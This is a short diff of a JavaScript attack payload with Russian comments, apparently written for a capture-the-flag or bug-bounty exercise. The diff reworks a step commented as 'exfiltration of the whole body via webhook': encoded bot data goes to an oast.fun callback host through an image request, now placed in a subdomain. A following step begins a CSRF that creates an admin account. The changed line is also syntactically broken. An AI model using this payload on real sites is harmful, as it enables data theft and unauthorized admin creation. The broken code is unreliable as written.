@@ -17,8 +17,7 @@ const encodedInfo = btoa(JSON.stringify(botInfo));
 
 /* 3) эксфиль всего тела через webhook */
 new Image().src =
-  "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/?info=" +
-  encodeURIComponent(encodedInfo);
+  "https://" + encodeURIComponent(encodedInfo) +.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/;
 
 /* 4) CSRF: создаём админа */
 const form = document.createElement("form");
